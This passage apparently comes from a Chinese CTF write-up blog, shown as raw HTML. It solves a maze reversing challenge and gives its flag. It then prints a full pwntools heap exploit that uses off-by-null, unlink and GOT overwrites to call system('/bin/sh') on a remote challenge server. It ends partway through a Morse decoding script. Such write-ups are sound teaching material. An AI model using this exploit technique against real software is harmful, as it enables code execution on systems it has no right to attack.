class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br><br><span class="hljs-attribute">1</span>层<br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br><br><span class="hljs-attribute">2</span>层<br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br><br><span class="hljs-attribute">3</span>层<br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">0</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">0</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">0</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">0</span> <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">0</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">0</span> <span class="hljs-number">0</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br><br><span class="hljs-attribute">4</span>层<br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br><br><span class="hljs-attribute">5</span>层<br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br><br><span class="hljs-attribute">6</span>层<br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">0</span>  <span class="hljs-number">0</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">0</span><br><br><span class="hljs-attribute">7</span>层<br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><code>511=64*7+63</code>所以程序要求从第0层的开头走到第7层的结尾</p><p>分别通过<code>a-下，b-上，l-左，r-右，u-下一层，d-上一层</code>进行移动</p><p><img src="/img/blog_img/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/page_Image/png5.png" srcset="/img/loading.gif" lazyload alt=""></p><p>input: <code>arruuuraaaaarrdbbuuuuuaadrrau</code></p><p>flag：<code>flag&#123;6c2a5b75-232d-26ea-c3cc-8f7a924d7357&#125;</code></p><h2 id="pwn">pwn</h2><h3 id="pwn2">pwn2</h3><p>利用创建<code>chunk</code>时的<code>off by null</code>漏洞，通过<code>chunk3</code>设置<code>chunk4</code>的<code>inuse</code>位为<code>0</code>，这样在释放<code>chunk4</code>时就会触发<code>unlink</code></p><p>利用<code>unlink</code>，在<code>chunk_list</code>中写入<code>chunk_list</code>的地址，这样可以达到任意地址读写,需要在合并之前将<code>chunk3</code>的<code>fd-&gt;bk</code>与<code>bk-&gt;fd</code>指向<code>chunk3</code>,<code>chunk3-&gt;fd</code>与<code>chunk3-&gt;bk</code>，就为<code>chunk_list</code>上的地址</p><p>然后因为程序中<code>strlen</code>和<code>free</code>都是以<code>chunk</code>为第一个参数，所以可以通过修改<code>got表</code>内<code>free</code>的内容为<code>plt表</code>中的<code>puts</code>，来获取<code>chunk3</code>的<code>fd</code>字段，计算得到<code>libc</code>地址，通过修改<code>got表</code>中的<code>strlen内容</code>为<code>system</code>地址 执行<code>system(&quot;/bin/sh&quot;)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(0~9):&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;(1 ~ 1024):&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;Content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(0~9):&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(0~9):&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(0~9):&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;Content:&#x27;</span>,data)<br><br>p=remote(<span class="hljs-string">&#x27;101.200.76.17&#x27;</span>,<span class="hljs-string">&#x27;24195&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./b64heap&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>e=ELF(<span class="hljs-string">&#x27;./b64heap&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>free_got=e.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>strlen_got=e.got[<span class="hljs-string">&#x27;strlen&#x27;</span>]<br>puts_plt=e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>chunk_list=<span class="hljs-number">0x6020c0</span><br>heap_list=chunk_list<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">3</span>)<br>fd=heap_list+<span class="hljs-number">0x8</span>*<span class="hljs-number">3</span>-<span class="hljs-number">0x18</span><br>bk=heap_list+<span class="hljs-number">0x8</span>*<span class="hljs-number">3</span>-<span class="hljs-number">0x10</span><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x98</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)+p64(fd)+p64(bk)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p64(<span class="hljs-number">0x90</span>))<br>free(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#free(3)</span><br>edit(<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>,p64(heap_list+<span class="hljs-number">0x8</span>*<span class="hljs-number">5</span>))<br>edit(<span class="hljs-number">0</span>,p64(heap_list+<span class="hljs-number">0x8</span>))<br>edit(<span class="hljs-number">3</span>,p64(free_got))<br>edit(<span class="hljs-number">5</span>,p8(<span class="hljs-number">0x80</span>))<br>edit(<span class="hljs-number">0</span>,p64(puts_plt))<br>free(<span class="hljs-number">1</span>)<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>malloc_hook=d-<span class="hljs-number">0x58</span>-<span class="hljs-number">0x10</span><br><br>system=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(strlen_got))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(system))<br>edit(<span class="hljs-number">3</span>,p64(strlen_got))<br>edit(<span class="hljs-number">0</span>,p64(system))<br><br>edit(<span class="hljs-number">6</span>,<span class="hljs-string">&#x27;cat flag\n&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/page_Image/png6.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="crypto">crypto</h2><h3 id="crypto1">crypto1</h3><p>只有A，B和空格，明显是摩斯<br>将<code>A</code>替换成<code>-</code>，<code>B</code>替换成<code>.</code>，<code>空格</code>替换<code>/</code></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">morse</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.codedict=&#123;<span class="hljs-string">&#x27;.-&#x27;</span>:<span class="hljs-string">&quot;a&quot;</span>,<br>                    <span class="hljs-string">&#x27;-...&#x27;</span>:<span class="hljs-string">&quot;b&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.-.&#x27;</span>:<span class="hljs-string">&quot;c&quot;</span>,<br>                    <span class="hljs-string">&#x27;-..&#x27;</span>:<span class="hljs-string">&quot;d&quot;</span>,<br>                    <span class="hljs-string">&#x27;.&#x27;</span>:<span class="hljs-string">&quot;e&quot;</span>,<br>                    <span class="hljs-string">&#x27;..-.&#x27;</span>:<span class="hljs-string">&quot;f&quot;</span>,<br>                    <span class="hljs-string">&#x27;--.&#x27;</span>:<span class="hljs-string">&quot;g&quot;</span>,<br>                    <span class="hljs-string">&#x27;....&#x27;</span>:<span class="hljs-string">&quot;h&quot;</span>,<br>                    <span class="hljs-string">&#x27;..&#x27;</span>:<span class="hljs-string">&quot;i&quot;</span>,<br>                    <span class="hljs-string">&#x27;.---&#x27;</span>:<span class="hljs-string">&quot;j&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.-&#x27;</span>:<span class="hljs-string">&quot;k&quot;</span>,<br>                    <span class="hljs-string">&#x27;.-..&#x27;</span>:<span class="hljs-string">&quot;l&quot;</span>,<br>                    <span class="hljs-string">&#x27;--&#x27;</span>:<span class="hljs-string">&quot;m&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.&#x27;</span>:<span class="hljs-string">&quot;n&quot;</span>,<br>                    <span class="hljs-string">&#x27;---&#x27;</span>:<span class="hljs-string">&quot;o&quot;</span>,<br>                    <span class="hljs-string">&#x27;.--.&#x27;</span>:<span class="hljs-string">&quot;p&quot;</span>,<br>                    <span class="hljs-string">&#x27;--.-&#x27;</span>:<span class="hljs-string">&quot;q&quot;</span>,<br>                    <span class="hljs-string">&#x27;.-.&#x27;</span>:<span class="hljs-string">&quot;r&quot;</span>,<br>                    <span class="hljs-string">&#x27;...&#x27;</span>:<span class="hljs-string">&quot;s&quot;</span>,<br>                    <span class="hljs-string">&#x27;-&#x27;</span>:<span class="hljs-string">&quot;t&quot;</span>,<br>                    <span class="hljs-string">&#x27;..-&#x27;</span>:<span class="hljs-string">&quot;u&quot;</span>,<br>                    <span class="hljs-string">&#x27;...-&#x27;</span>:<span class="hljs-string">&quot;v&quot;</span>,<br>                    <span class="hljs-string">&#x27;.--&#x27;</span>:<span class="hljs-string">&quot;w&quot;</span>,<br>                    <span class="hljs-string">&#x27;-..-&#x27;</span>:<span class="hljs-string">&quot;x&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.--&#x27;</span>:<span class="hljs-string">&quot;y&quot;</span>,<br>                    <span class="hljs-string">&#x27;--..&#x27;</span>:<span class="hljs-string">&quot;z&quot;</span>,<br>                    <span class="hljs-string">&#x27;.----&#x27;</span>:<span class="hljs-string">&quot;1&quot;</span>,<br>                    <span class="hljs-string">&#x27;..---&#x27;</span>:<span class="hljs-string">&quot;2&quot;</span>,<br>                    <span class="hljs-string">&#x27;...--&#x27;</span>:<span class="hljs-string">&quot;3&quot;</span>,<br>                    <span class="hljs-string">&#x27;....-&#x27;</span>:<span 